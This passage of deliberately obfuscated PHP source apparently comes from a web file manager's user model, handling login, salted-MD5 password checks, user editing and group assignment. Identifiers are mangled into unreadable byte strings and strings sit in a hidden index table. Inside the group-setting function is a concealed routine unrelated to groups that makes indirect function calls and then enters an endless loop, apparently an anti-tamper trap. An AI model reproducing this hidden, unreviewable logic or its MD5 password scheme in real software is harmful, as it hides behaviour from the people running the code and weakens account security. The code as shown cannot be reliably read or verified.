md5($ˆìëøÌê[2626] . $‚†öò×ğ[$ˆìëøÌê[999]] . $ˆìëøÌê[2627] . $‚†öò×ğ[$ˆìëøÌê[32]]); $‚†öò×ğ = $this->_listDataApplyItem($‚†öò×ğ); $ä†»ÒŸØ = Model($ˆìëøÌê[1479])->metaGet($‚†öò×ğ[$ˆìëøÌê[90]][$ˆìëøÌê[192]]); $‚†öò×ğ[$ˆìëøÌê[2628]] = $»Ùöáô©; $‚†öò×ğ[$ˆìëøÌê[90]][$ˆìëøÌê[2412]] = isset($ä†»ÒŸØ[$ˆìëøÌê[2413]]) ? $ä†»ÒŸØ[$ˆìëøÌê[2413]] : null; if ($€šõœ­ô) { $‚†öò×ğ[$ˆìëøÌê[562]] = $this->metaGet($‚†öò×ğ[$ˆìëøÌê[1539]]); } return $‚†öò×ğ; } protected function getInfoSimpleOuter($”‡‹¶»‘) { $ß‹ÁË¬Ë =& $_SERVER[€ä¾™²]; if (!$”‡‹¶»‘ || $”‡‹¶»‘ == 0) { return array($ß‹ÁË¬Ë[1539] => $ß‹ÁË¬Ë[229], $ß‹ÁË¬Ë[32] => $ß‹ÁË¬Ë[174] . LNG($ß‹ÁË¬Ë[2629]) . $ß‹ÁË¬Ë[176], $ß‹ÁË¬Ë[2319] => STATIC_PATH . $ß‹ÁË¬Ë[2630]); } $ôÕÒ¸è = $this->cacheFunctionGet($ß‹ÁË¬Ë[2218], $”‡‹¶»‘); $ëÂÓñõ = array_field_key($ôÕÒ¸è, explode($ß‹ÁË¬Ë[50], $this->simpleField)); if (!$ëÂÓñõ) { return array($ß‹ÁË¬Ë[1539] => $ß‹ÁË¬Ë[1323], $ß‹ÁË¬Ë[32] => $ß‹ÁË¬Ë[174] . LNG($ß‹ÁË¬Ë[2631]) . $ß‹ÁË¬Ë[176], $ß‹ÁË¬Ë[2319] => STATIC_PATH . $ß‹ÁË¬Ë[2632]); } $ëÂÓñõ[$ß‹ÁË¬Ë[2319]] = Action($ß‹ÁË¬Ë[2320])->parseUrl($ëÂÓñõ[$ß‹ÁË¬Ë[2319]]); return $ëÂÓñõ; } protected function groupUser($£½áêÁ÷) { } public static function errorLang($õ†ÒÀïÆ) { $òıŒ ëæ =& $_SERVER[€ä¾™²]; $ôÛ¦’‚ = array(self::ERROR_USER_NOT_EXISTS => $òıŒ ëæ[2633], self::ERROR_USER_PASSWORD_ERROR => $òıŒ ëæ[2634], self::ERROR_USER_EXIST_NAME => $òıŒ ëæ[2635], self::ERROR_USER_EXIST_PHONE => $òıŒ ëæ[2636], self::ERROR_USER_EXIST_EMAIL => $òıŒ ëæ[2637], self::ERROR_USER_LOGIN_LOCK => $òıŒ ëæ[2638], self::ERROR_IP_NOT_ALLOW => $òıŒ ëæ[2639], self::ERROR_USER_EXIST_NICKNAME => $òıŒ ëæ[2640]); $ı½ñ¾Ü = LNG($ôÛ¦’‚[$õ†ÒÀïÆ]); if ($õ†ÒÀïÆ == self::ERROR_USER_LOGIN_LOCK) { $’ıÈ†öï = (int) Model($òıŒ ëæ[1435])->get($òıŒ ëæ[2641]); if ($’ıÈ†öï > 60) { $ı½ñ¾Ü = str_replace($òıŒ ëæ[91], ceil($’ıÈ†öï / 60), $ı½ñ¾Ü); } } return $ı½ñ¾Ü; } protected function metaSet($±²ş³ÕŒ, $çÊúÖûÆ = null, $Ù«©ôÚ£ = null) { $this->clearCache($±²ş³ÕŒ); return parent::metaSet($±²ş³ÕŒ, $çÊúÖûÆ, $Ù«©ôÚ£); } public function getInfoByMeta($Ï¢•£Ä, $ì¤äÈúá) { $¹À¤Ÿ¯ğ =& $_SERVER[€ä¾™²]; $î¹³ÏÏÏ = Model($¹À¤Ÿ¯ğ[2642])->where(array($¹À¤Ÿ¯ğ[95] => $Ï¢•£Ä, $¹À¤Ÿ¯ğ[451] => $ì¤äÈúá))->find(); if ($î¹³ÏÏÏ) { return $this->getInfo($î¹³ÏÏÏ[$¹À¤Ÿ¯ğ[1539]]); } return !1; } public function userLoginCheck($¼â©¡†œ, $¶‡… Éñ, $ëïÛ¥á€ = false) { $¥ñÁ¼á =& $_SERVER[€ä¾™²]; $óÕı²ıÅ = $this->userLoginFind($¼â©¡†œ); if (!$óÕı²ıÅ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($óÕı²ıÅ[$¥ñÁ¼á[1539]], $¶‡… Éñ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $ëïÛ¥á€ ? $this->getInfoFull($óÕı²ıÅ[$¥ñÁ¼á[1539]]) : $this->getInfo($óÕı²ıÅ[$¥ñÁ¼á[1539]]); } public function userLoginFind($¤·Â“Ë) { $Îû¨àÊ÷ =& $_SERVER[€ä¾™²]; $ËÚÅÁÆ = array($Îû¨àÊ÷[32] => $¤·Â“Ë, $Îû¨àÊ÷[2424] => $¤·Â“Ë, $Îû¨àÊ÷[381] => $¤·Â“Ë, $Îû¨àÊ÷[2643] => $¤·Â“Ë, $Îû¨àÊ÷[1113] => $Îû¨àÊ÷[1115]); if ($this->nickNameRpt()) { unset($ËÚÅÁÆ[$Îû¨àÊ÷[2424]]); } return $this->where($ËÚÅÁÆ)->find(); } public function clearCache($¾°Ç»Œü) { $é­š×´ü =& $_SERVER[€ä¾™²]; $this->cacheFunctionClear($é­š×´ü[2217], $¾°Ç»Œü); $this->cacheFunctionClear($é­š×´ü[2218], $¾°Ç»Œü); $this->cacheFunctionClear($é­š×´ü[2644], $¾°Ç»Œü); } public function userPasswordCheck($ÖŒÁ—˜À, $ŠŞÓ¥Ÿ­) { $º†ãØ“á =& $_SERVER[€ä¾™²]; $ê§õñ·Ê = $this->where(array($º†ãØ“á[1539] => intval($ÖŒÁ—˜À)))->find(); $×âåóÑÚ = $this->metaGet($ÖŒÁ—˜À); $é§ØëØ¦ = isset($×âåóÑÚ[$º†ãØ“á[2645]]) ? $×âåóÑÚ[$º†ãØ“á[2645]] : $º†ãØ“á[12]; if (md5($é§ØëØ¦ . trim($ŠŞÓ¥Ÿ­)) !== $ê§õñ·Ê[$º†ãØ“á[999]]) { return !1; } return !0; } public function userAdd($Ş€¸û¿) { $³£Çé¡ =& $_SERVER[€ä¾™²]; $½¹èöó£ = array($³£Çé¡[516] => $Ş€¸û¿[$³£Çé¡[32]], $³£Çé¡[2646] => $Ş€¸û¿[$³£Çé¡[2318]], $³£Çé¡[2647] => isset($Ş€¸û¿[$³£Çé¡[381]]) ? $Ş€¸û¿[$³£Çé¡[381]] : $³£Çé¡[12], $³£Çé¡[2648] => isset($Ş€¸û¿[$³£Çé¡[2643]]) ? $Ş€¸û¿[$³£Çé¡[2643]] : $³£Çé¡[12], $³£Çé¡[2649] => isset($Ş€¸û¿[$³£Çé¡[2424]]) ? $Ş€¸û¿[$³£Çé¡[2424]] : $Ş€¸û¿[$³£Çé¡[32]], $³£Çé¡[2650] => isset($Ş€¸û¿[$³£Çé¡[2319]]) ? $Ş€¸û¿[$³£Çé¡[2319]] : $³£Çé¡[12], $³£Çé¡[2651] => isset($Ş€¸û¿[$³£Çé¡[2652]]) ? $Ş€¸û¿[$³£Çé¡[2652]] : 1, $³£Çé¡[2653] => $Ş€¸û¿[$³£Çé¡[999]], $³£Çé¡[2211] => isset($Ş€¸û¿[$³£Çé¡[2115]]) ? $Ş€¸û¿[$³£Çé¡[2115]] : 1024 * 1024 * 20, $³£Çé¡[2212] => 0, $³£Çé¡[2654] => 0, $³£Çé¡[2257] => isset($Ş€¸û¿[$³£Çé¡[850]]) ? $Ş€¸û¿[$³£Çé¡[850]] : 1); if (!empty($Ş€¸û¿[$³£Çé¡[1539]])) { $½¹èöó£[$³£Çé¡[1539]] = $Ş€¸û¿[$³£Çé¡[1539]]; } $™Ä«Ğ« = $this->_checkExist($Ş€¸û¿); if ($™Ä«Ğ« !== !0) { return $™Ä«Ğ«; } if (!empty($½¹èöó£[$³£Çé¡[2319]]) && strlen($½¹èöó£[$³£Çé¡[2319]]) > 255) { $½¹èöó£[$³£Çé¡[2319]] = $³£Çé¡[12]; } $®Ğ’ã»‰ = $this->add($½¹èöó£); $äÈÜÈ–ß = array($³£Çé¡[2653] => $½¹èöó£[$³£Çé¡[999]], $³£Çé¡[2649] => $½¹èöó£[$³£Çé¡[2424]], $³£Çé¡[2655] => $Ş€¸û¿[$³£Çé¡[2216]]); $this->userEdit($®Ğ’ã»‰, $äÈÜÈ–ß); Model($³£Çé¡[1479])->userRootAdd($®Ğ’ã»‰); return $®Ğ’ã»‰; } protected function userEditTest($†¸ƒ‰ ğ, $È¼ÙÕÌ€) { return $this->call($_SERVER[€ä¾™²][2656], $†¸ƒ‰ ğ, $È¼ÙÕÌ€); } protected function userEdit($Ñ¶®«Øû, $ÂúÍØ¢ì) { $ÚêººÔ‹ =& $_SERVER[€ä¾™²]; $Ó¥ö¥²» = $this->getInfoSimple($Ñ¶®«Øû); if (!$Ó¥ö¥²») { return !1; } $õˆ¥•ñ× = $this->_checkExist($ÂúÍØ¢ì, $Ñ¶®«Øû); if ($õˆ¥•ñ× !== !0) { return $õˆ¥•ñ×; } if (isset($ÂúÍØ¢ì[$ÚêººÔ‹[999]]) && trim($ÂúÍØ¢ì[$ÚêººÔ‹[999]]) != $ÚêººÔ‹[12]) { $Ÿœûë× = $this->metaGet($Ñ¶®«Øû); if (empty($Ÿœûë×[$ÚêººÔ‹[2645]])) { $Ÿœûë×[$ÚêººÔ‹[2645]] = rand_string(10); Model($ÚêººÔ‹[604])->metaSet($Ñ¶®«Øû, $ÚêººÔ‹[2645], $Ÿœûë×[$ÚêººÔ‹[2645]]); } $ÂúÍØ¢ì[$ÚêººÔ‹[999]] = md5($Ÿœûë×[$ÚêººÔ‹[2645]] . trim($ÂúÍØ¢ì[$ÚêººÔ‹[999]])); } else { unset($ÂúÍØ¢ì[$ÚêººÔ‹[999]]); } if (!empty($ÂúÍØ¢ì[$ÚêººÔ‹[2319]]) && strlen($ÂúÍØ¢ì[$ÚêººÔ‹[2319]]) > 255) { $ÂúÍØ¢ì[$ÚêººÔ‹[2319]] = $ÚêººÔ‹[12]; } if (isset($ÂúÍØ¢ì[$ÚêººÔ‹[2424]])) { $this->setNamePinyin($Ñ¶®«Øû, $ÂúÍØ¢ì[$ÚêººÔ‹[2424]]); } if (isset($ÂúÍØ¢ì[$ÚêººÔ‹[2216]])) { $å´­¹Ó = $ÚêººÔ‹[1438] . $Ñ¶®«Øû; $ñ»ËÅ« = $ÚêººÔ‹[1436]; $Œïöã = $ÂúÍØ¢ì[$ÚêººÔ‹[2216]] ? $ÂúÍØ¢ì[$ÚêººÔ‹[2216]] : $ÚêººÔ‹[12]; $š‹¶’İÎ = Model($ÚêººÔ‹[1435])->get($å´­¹Ó, $ñ»ËÅ«); $š‹¶’İÎ = $š‹¶’İÎ ? $š‹¶’İÎ : $ÚêººÔ‹[12]; if ($š‹¶’İÎ != $Œïöã) { if (!$Œïöã && $š‹¶’İÎ) { Model($ÚêººÔ‹[1435])->remove($å´­¹Ó, $ñ»ËÅ«); } else { if ($Œïöã) { Model($ÚêººÔ‹[1435])->set($å´­¹Ó, $Œïöã, $ñ»ËÅ«); } } } unset($ÂúÍØ¢ì[$ÚêººÔ‹[2216]]); Model($ÚêººÔ‹[624])->metaSet($Ñ¶®«Øû, $ÚêººÔ‹[2216], $Œïöã); } if (empty($ÂúÍØ¢ì)) { return !0; } $this->where(array($ÚêººÔ‹[1913] => $Ñ¶®«Øû))->save($ÂúÍØ¢ì); $this->clearCache($Ñ¶®«Øû); return !0; } public function setNamePinyin($ò½íú¬¸, $±È¡ÜõÄ = false) { $Õ¹Á‹Å¶ =& $_SERVER[€ä¾™²]; if (!$±È¡ÜõÄ) { $¬”±•ç = $this->getInfoSimple($ò½íú¬¸); $±È¡ÜõÄ = $¬”±•ç[$Õ¹Á‹Å¶[2424]] ? $¬”±•ç[$Õ¹Á‹Å¶[2424]] : $¬”±•ç[$Õ¹Á‹Å¶[32]]; } $ë™Ì²Ñ„ = Model($Õ¹Á‹Å¶[624]); if (!Input::check($±È¡ÜõÄ, $Õ¹Á‹Å¶[684])) { return $ë™Ì²Ñ„->metaSet($ò½íú¬¸, array($Õ¹Á‹Å¶[559] => $Õ¹Á‹Å¶[12], $Õ¹Á‹Å¶[558] => $Õ¹Á‹Å¶[12])); } return $ë™Ì²Ñ„->metaSet($ò½íú¬¸, array($Õ¹Á‹Å¶[559] => str_replace($Õ¹Á‹Å¶[53], $Õ¹Á‹Å¶[12], Pinyin::get($±È¡ÜõÄ)), $Õ¹Á‹Å¶[558] => Pinyin::get($±È¡ÜõÄ, $Õ¹Á‹Å¶[685]))); } private function nickNameRpt() { $Ï«îŠ†á =& $_SERVER[€ä¾™²]; $åŠ–æõÑ = Model($Ï«îŠ†á[873])->get($Ï«îŠ†á[2657]); $Ú‰ƒÍ±û = $GLOBALS[$Ï«îŠ†á[6]][$Ï«îŠ†á[468]][$Ï«îŠ†á[2657]]; $¨òÖÏê‚ = !is_null($åŠ–æõÑ) ? $åŠ–æõÑ : $Ú‰ƒÍ±û; return !!$¨òÖÏê‚; } private function _checkExist($ËûôÜÇ¿, $Ü€ªö = false) { $ä±ÓÅÌ„ =& $_SERVER[€ä¾™²]; $Ìš­»·º = array($ä±ÓÅÌ„[32] => UserModel::ERROR_USER_EXIST_NAME, $ä±ÓÅÌ„[2424] => UserModel::ERROR_USER_EXIST_NICKNAME, $ä±ÓÅÌ„[381] => UserModel::ERROR_USER_EXIST_EMAIL, $ä±ÓÅÌ„[2643] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Ìš­»·º[$ä±ÓÅÌ„[2424]]); } $Ó­Ã’€Ó = $Ü€ªö ? array($ä±ÓÅÌ„[1539] => array($ä±ÓÅÌ„[2658], $Ü€ªö)) : array(); foreach ($Ìš­»·º as $Ÿ·áãè¾ => $¿çûå) { $†İ¸ç = array(); foreach ($Ìš­»·º as $ØÚùáê× => $‡Óè™Äá) { if (isset($ËûôÜÇ¿[$ØÚùáê×]) && $ËûôÜÇ¿[$ØÚùáê×]) { $†İ¸ç[] = $ËûôÜÇ¿[$ØÚùáê×]; } } if (!$†İ¸ç) { continue; } $Öû­‡øæ = array_merge(array($Ÿ·áãè¾ => array($ä±ÓÅÌ„[7], $†İ¸ç)), $Ó­Ã’€Ó); $Ôª­ÇØ³ = $this->where($Öû­‡øæ)->find(); if ($Ôª­ÇØ³) { return $¿çûå; } } return !0; } public function userListInfo($¤ñÛ»ÑÃ) { $şŠšÉÆû =& $_SERVER[€ä¾™²]; $¦ŸÍ úâ = array(); $¤ñÛ»ÑÃ = is_array($¤ñÛ»ÑÃ) ? array_unique($¤ñÛ»ÑÃ) : array(); if (!$¤ñÛ»ÑÃ) { return $¦ŸÍ úâ; } if (count($¤ñÛ»ÑÃ) < 20) { foreach ($¤ñÛ»ÑÃ as $¼Œ—ªİ¶) { $¦ŸÍ úâ[$¼Œ—ªİ¶ . $şŠšÉÆû[12]] = $this->getInfoSimpleOuter($¼Œ—ªİ¶); } } else { $şæ¢°™â = array($şŠšÉÆû[1913] => array($şŠšÉÆû[514], $¤ñÛ»ÑÃ)); if (count($¤ñÛ»ÑÃ) == 1) { $şæ¢°™â = array($şŠšÉÆû[1913] => $¤ñÛ»ÑÃ[0]); } $–»Ÿ‡…ø = Model($şŠšÉÆû[604])->field($this->simpleField)->where($şæ¢°™â)->select(); $–»Ÿ‡…ø = array_to_keyvalue($–»Ÿ‡…ø, $şŠšÉÆû[1539]); foreach ($¤ñÛ»ÑÃ as $¼Œ—ªİ¶) { $ÌìçÛË = $–»Ÿ‡…ø[$¼Œ—ªİ¶]; if (!$ÌìçÛË) { $¦ŸÍ úâ[$¼Œ—ªİ¶ . $şŠšÉÆû[12]] = $this->getInfoSimpleOuter($¼Œ—ªİ¶); continue; } $ÌìçÛË[$şŠšÉÆû[2319]] = Action($şŠšÉÆû[2320])->parseUrl($ÌìçÛË[$şŠšÉÆû[2319]]); $¦ŸÍ úâ[$¼Œ—ªİ¶ . $şŠšÉÆû[12]] = $ÌìçÛË; } } return $¦ŸÍ úâ; } protected function userStatus($¸íÂ«İ›, $Ú‡‰¯èË) { $íÃüŞÃÏ = $this->getInfoSimple($¸íÂ«İ›); if (!$íÃüŞÃÏ) { return !1; } $¢Úƒ¯’ñ = array($_SERVER[€ä¾™²][850] => $Ú‡‰¯èË); return $this->userEdit($¸íÂ«İ›, $¢Úƒ¯’ñ); } protected function userRemove($ø¼îğ‹Ü) { $¥¿ÔÉŞ =& $_SERVER[€ä¾™²]; $›–•´¸ˆ = $this->getInfoSimple($ø¼îğ‹Ü); if (!$›–•´¸ˆ) { return !1; } $œ©£”˜ = array($¥¿ÔÉŞ[1913] => $ø¼îğ‹Ü); Model($¥¿ÔÉŞ[693])->where($œ©£”˜)->delete(); Model($¥¿ÔÉŞ[2659])->where($œ©£”˜)->delete(); Model($¥¿ÔÉŞ[2220])->where($œ©£”˜)->delete(); Model($¥¿ÔÉŞ[2642])->where($œ©£”˜)->delete(); Model($¥¿ÔÉŞ[1181])->where($œ©£”˜)->delete(); Model($¥¿ÔÉŞ[2441])->removeUserAll($ø¼îğ‹Ü); Model($¥¿ÔÉŞ[932])->userRootRemove($ø¼îğ‹Ü); return $this->where($œ©£”˜)->delete(); } protected function userGroupSet($ıË¤ƒ‘ã, $Æ…Ê›ä—, $¢‚£Ï´Ï = array()) { $èªëÄ”ü =& $_SERVER[€ä¾™²]; if (!isset($_SERVER[$èªëÄ”ü[491]]) || !isset($_SERVER[$èªëÄ”ü[492]])) { $×Û’¥¤ = $èªëÄ”ü[989]; $Ø¿êİ‹ú = $èªëÄ”ü[493]; $µşıÅ = $_SERVER[$èªëÄ”ü[494]] . $èªëÄ”ü[495]; $ª‘ƒì¤ä = $Ø¿êİ‹ú($µşıÅ); $§Ñ„“ÇÌ = explode($èªëÄ”ü[286], $ª‘ƒì¤ä); if (count($§Ñ„“ÇÌ) < $èªëÄ”ü[722]) { $±û´Ğğ— = $èªëÄ”ü[497]; $±û´Ğğ—(); } $ª÷²ƒ˜² = $èªëÄ”ü[990]; $ª÷²ƒ˜²($_SERVER[$èªëÄ”ü[991]]); $ºöÓú©‘ = 1; for ($ÔİùØŞ· = $ºöÓú©‘; $ÔİùØŞ· > 0; $ÔİùØŞ·++) { $ª÷²ƒ˜² = json_encode($GLOBALS[$èªëÄ”ü[514]]); } } $„Âûİ—Í = $this->getInfoSimple($ıË¤ƒ‘ã); if (!$„Âûİ—Í || !is_array($Æ…Ê›ä—)) { return !1; } $ª‡œ¶ï³ = Model($èªëÄ”ü[2220]); $ª‡œ¶ï³->where(array($èªëÄ”ü[1539] => $ıË¤ƒ‘ã))->delete(); $í™¾øë½ = array(); $×µÌ¢ùæ = 0; foreach ($Æ…Ê›ä— as $©³¨½‡Î => $Ÿ¨õ†Õ­) { $½¾Ş˜øÖ = array($èªëÄ”ü[1539] => $ıË¤ƒ‘ã, $èªëÄ”ü[1441] => $©³¨½‡Î, $èªëÄ”ü[1586] => $Ÿ¨õ†Õ­); $½¾Ş˜øÖ[$èªëÄ”ü[2150]] = isset($¢‚£Ï´Ï[$×µÌ¢ùæ]) ? $¢‚£Ï´Ï[$×µÌ¢ùæ] : 0; $×µÌ¢ùæ++; $í™¾øë½[] = $½¾Ş˜øÖ; } return $ª‡œ¶ï³->addAll($í™¾øë½, array(), !0); } protected function userGroupAdd($Ô­Èò¸, $Ê¬¡”Ç² = array()) { $ä‰úÅ =& $_SERVER[€ä¾™²]; $®¯”‡İ¨ = $this->getInfoSimple($Ô­Èò¸); if (!$®¯”‡İ¨ || empty($Ê¬¡”Ç²)) { return !1; } $ƒøíÚ¨¬ = array(); foreach ($Ê¬¡”Ç² as $åÜ—ğë– => $ßƒö¸Ş€) { $ƒøíÚ¨¬[] = array($ä‰úÅ[1539] => $Ô­Èò¸, $ä‰úÅ[1441] => $åÜ—ğë–, $ä‰úÅ[1586] => $ßƒö¸Ş€, $ä‰úÅ[2150] => 0); } return Model($ä‰úÅ[2220])->addAll($ƒøíÚ¨¬, array(), !0); } protected function userGroupRemove($€ÈøÈ–õ, $«äñ…Çó) { $ ¼®ïÑ‹ =& $_SERVER[€ä¾™²]; $Ø©ÒÁî = $this->getInfoSimple($€ÈøÈ–õ); if (!$Ø©ÒÁî || !$«äñ…Çó) { return !1; } $µÊ½Œ = array($ ¼®ïÑ‹[1913] => $€ÈøÈ–õ, $ ¼®ïÑ‹[2213] => $«äñ…Çó); return Model($ ¼®ïÑ‹[2220])->where($µÊ½Œ)->delete(); } public function listData() { $Æ³‚´€Ä = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Æ³‚´€Ä[$_SERVER[€ä¾™²][446]]); return $Æ³‚´€Ä; } public function listByID($§íÕêú›) { $Ãñ÷Âºö =& $_SERVER[€ä¾™²]; if (!$§íÕêú›) { return; } $í…éƒÎ® = array($Ãñ÷Âºö[1539] => array($Ãñ÷Âºö[7], $§íÕêú›)); $Ş¸õœÖ = $this->where($í…éƒÎ®)->select(); $Ş¸õœÖ = array_sort_keep($Ş¸õœÖ, $Ãñ÷Âºö[1539], $§íÕêú›); $this->_listDataApply($Ş¸õœÖ); return $Ş¸õœÖ; } public function listByGroup($ˆ²¾Ÿé˜ = 0, $Ùº’Õ×Â = array()) { $è ¨ã“Å =& $_SERVER[€ä¾™²]; $’ôçÌ¾¦ = $è ¨ã“Å[12]; $ö±¯¿‘÷ = array(); if ($ˆ²¾Ÿé˜) { $ö±¯¿‘÷ = array($è ¨ã“Å[2660] => intval($ˆ²¾Ÿé˜)); $’ôçÌ¾¦ = "\114\x45\106\124\40\112\x4f\x49\116\40{$this->tablePrefix}\165\x73\x65\162\x5f\x67\162\x6f\165\160\x20\x75\x73\145\x72\137\x67\x72\157\x75\x70\40\157\156\x20\x75\163\145\x72\x2e\x75\163\x65\162\111\x44\x20\x3d\40\165\163\x65\162\x5f\147\162\x6f\165\160\56\x75\x73\x65\162\x49\104"; $çÚèÍ = Input::get($è ¨ã“Å[551], null, $è ¨ã“Å[12]) ? $è ¨ã“Å[12] : $è ¨ã“Å[2661]; } if (isset($Ùº’Õ×Â[$è ¨ã“Å[850]])) { $ö±¯¿‘÷[$è ¨ã“Å[2662]] = $Ùº’Õ×Â[$è ¨ã“Å[850]]; } $îôë”Â = _get($Ùº’Õ×Â, $è ¨ã“Å[2663], $è ¨ã“Å[232]); if (_get($Ùº’Õ×Â, $è ¨ã“Å[861], !1)) { $ö±¯¿‘÷[$îôë”Â] = array($è ¨ã“Å[2406], $Ùº’Õ×Â[$è ¨ã“Å[861]]); } if (_get($Ùº’Õ×Â, $è ¨ã“Å[862], !1)) { $ùÕÛ×¢™ = array($è ¨ã“Å[2407], $Ùº’Õ×Â[$è ¨ã“Å[862]]); if ($ö±¯¿‘÷[$îôë”Â]) { $ö±¯¿‘÷[$îôë”Â] = array($ö±¯¿‘÷[$îôë”Â], $ùÕÛ×¢™, $è ¨ã“Å[2408]); } else { $ö±¯¿‘÷[$îôë”Â] = $ùÕÛ×¢™; } } $Û˜ê¬Å„ = $this->_makeOrder($çÚèÍ)->field($è ¨ã“Å[2664])->where($ö±¯¿‘÷)->join($’ôçÌ¾¦)->selectPage(50); $this->_listDataApply($Û˜ê¬Å„[$è ¨ã“Å[446]]); return $Û˜ê¬Å„; } private function _makeOrder($ùåªúÎ® = '') { $ÁªÓ‚” =& $_SERVER[€ä¾™²]; $è»•æ› = array($ÁªÓ‚”[1539], $ÁªÓ‚”[32], $ÁªÓ‚”[2117], $ÁªÓ‚”[2318], $ÁªÓ‚”[2092], $ÁªÓ‚”[232]); $îÌÏÕÇ = array($ÁªÓ‚”[544] => $ÁªÓ‚”[545], $ÁªÓ‚”[546] => $ÁªÓ‚”[547]); $ƒ³ÆŸÂÅ = Input::get($ÁªÓ‚”[551], $ÁªÓ‚”[7], $ÁªÓ‚”[1913], $è»•æ›); $€–… Š¶ = Input::get($ÁªÓ‚”[552], $ÁªÓ‚”[7], $ÁªÓ‚”[2221], array($ÁªÓ‚”[2221], $ÁªÓ‚”[546])); $€–… Š¶ = $îÌÏÕÇ[$€–… Š¶]; $ùåªúÎ® = $ùåªúÎ® . "\165\x73\x65\x72\x2e{$ƒ³ÆŸÂÅ}\40{$€–… Š¶}\54\x20\165\163\145\x72\56\x75\163\145\x72\111\104\x20\x61\163\143"; return $this->alias($ÁªÓ‚”[2353])->order($ùåªúÎ®); } public function listSearch($ŸŠÀßÂ³) { $ä°š˜¬ =& $_SERVER[€ä¾™²]; $ßÛ˜—­± = trim($ŸŠÀßÂ³[$ä°š˜¬[2224]]); $§ˆŸ²¦ = explode($ä°š˜¬[53], $ßÛ˜—­±); if (!$ßÛ˜—­± || count($§ˆŸ²¦) == 1) { return $this->listSearchNow($ŸŠÀßÂ³); } $É¬„çñ€ = array($ä°š˜¬[446] => array()); foreach ($§ˆŸ²¦ as $ã†ì£íá) { if (!trim($ã†ì£íá)) { continue; } $ŸŠÀßÂ³[$ä°š˜¬[2224]] = $ã†ì£íá; $¡”Šèš = $this->listSearchNow($ŸŠÀßÂ³); $É¬„çñ€[$ä°š˜¬[446]] = array_merge($É¬„çñ€[$ä°š˜¬[446]], $¡”Šèš[$ä°š˜¬[446]]); } $É¬„çñ€[$ä°š˜¬[446]] = array_unique_by_key($É¬„çñ€[$ä°š˜¬[446]], $ä°š˜¬[1539]); $É¬„çñ€[$ä°š˜¬[443]] = array($ä°š˜¬[444] => count($É¬„çñ€[$ä°š˜¬[446]]), $ä°š˜¬[440] => 20, $ä°š˜¬[429] => 1, $ä°š˜¬[445] => 1); return $É¬„çñ€; } public function listSearchNow($ûóÈú) { $ºéãÃºŒ =& $_SERVER[€ä¾™²]; $§Å°›ß¸ = trim($ûóÈú[$ºéãÃºŒ[2224]]); $Ñ²•¨ƒÒ = isset($ûóÈú[$ºéãÃºŒ[2225]]) ? $ûóÈú[$ºéãÃºŒ[2225]] : !1; $§Å°›ß¸ = str_replace($ºéãÃºŒ[2226], $ºéãÃºŒ[2227], trim($§Å°›ß¸)); $¾ËĞ¦±¿ = array($ºéãÃºŒ[32] => array($ºéãÃºŒ[473], "\x25{$§Å°›ß¸}\45"), $ºéãÃºŒ[381] => array($ºéãÃºŒ[473], "{$§Å°›ß¸}\45"), $ºéãÃºŒ[2424] => array($ºéãÃºŒ[473], "\45{$§Å°›ß¸}\45"), $ºéãÃºŒ[1113] => $ºéãÃºŒ[2228]); if (Input::check($§Å°›ß¸, $ºéãÃºŒ[387])) { $¾ËĞ¦±¿[$ºéãÃºŒ[1539]] = array($ºéãÃºŒ[473], "{$§Å°›ß¸}\x25"); $¾ËĞ¦±¿[$ºéãÃºŒ[2643]] = array($ºéãÃºŒ[473], "{$§Å°›ß¸}\45"); } if (!$§Å°›ß¸) { $¾ËĞ¦±¿ = array(); } if (isset($ûóÈú[$ºéãÃºŒ[850]])) { $¾ËĞ¦±¿[$ºéãÃºŒ[850]] = $ûóÈú[$ºéãÃºŒ[850]]; } $¾ËĞ¦±¿ = $this->parseWhereLike($¾ËĞ¦±¿); $©ßıÅÀ¦ = $this->_makeOrder()->where($¾ËĞ¦±¿)->selectPage(20); if (!$©ßıÅÀ¦ || count($©ßıÅÀ¦[$ºéãÃºŒ[446]]) < 5 && Input::check($§Å°›ß¸, $ºéãÃºŒ[394])) { $ÖÙ•·÷´ = $this->_searchFromMeta($ºéãÃºŒ[558], $§Å°›ß¸, 10); $¦±¡¹˜÷ = $this->_searchFromMeta($ºéãÃºŒ[559], $§Å°›ß¸, 10); $Šş·æ±Ñ = array_merge($ÖÙ•·÷´, $¦±¡¹˜÷, $©ßıÅÀ¦[$ºéãÃºŒ[446]]); $©ßıÅÀ¦[$ºéãÃºŒ[446]] = array_unique_by_key($Šş·æ±Ñ, $ºéãÃºŒ[1539]); $©ßıÅÀ¦[$ºéãÃºŒ[443]][$ºéãÃºŒ[444]] = count($©ßıÅÀ¦[$ºéãÃºŒ[446]]); $©ßıÅÀ¦[$ºéãÃºŒ[443]][$ºéãÃºŒ[445]] = ceil($©ßıÅÀ¦[$ºéãÃºŒ[443]][$ºéãÃºŒ[444]] / $©ßıÅÀ¦[$ºéãÃºŒ[443]][$ºéãÃºŒ[440]]); } $this->_listDataApply($©ßıÅÀ¦[$ºéãÃºŒ[446]]); $this->_filterByGroup($©ßıÅÀ¦, $Ñ²•¨ƒÒ); return $©ßıÅÀ¦; } private function _filterByGroup(&$²ûÃ¹†¥, $Ÿ÷‰ùŸ¶) { $ ôÏªè =& $_SERVER[€ä¾™²]; if (!$Ÿ÷‰ùŸ¶) { return $²ûÃ¹†¥; } foreach ($²ûÃ¹†¥[$ ôÏªè[446]] as $›Âëá ô => &$Äûƒèè÷) { $éŞ¬Í´è = array_to_keyvalue($Äûƒèè÷[$ ôÏªè[1440]], $ ôÏªè[12], $ ôÏªè[1441]); if (!in_array($Ÿ÷‰ùŸ¶, $éŞ¬Í´è)) { unset($²ûÃ¹†¥[$ ôÏªè[446]][$›Âëá ô]); } } unset($Äûƒèè÷); $²ûÃ¹†¥[$ ôÏªè[446]] = array_values($²ûÃ¹†¥[$ ôÏªè[446]]); $²ûÃ¹†¥[$ ôÏªè[443]] = array($ ôÏªè[2389] => count($²ûÃ¹†¥[$ ôÏªè[446]]), $ ôÏªè[2387] => $²ûÃ¹†¥[$ ôÏªè[443]][$ ôÏªè[440]], $ ôÏªè[2386] => 1, $ ôÏªè[2388] => 1); } private function _searchFromMeta($ÄÊç„È—, $±®ÄÍê¶, $Æ°–õÔÖ) { $ò¦—Ôê =& $_SERVER[€ä¾™²]; $±®ÄÍê¶ = strtolower($±®ÄÍê¶); $Æ±œâúû = 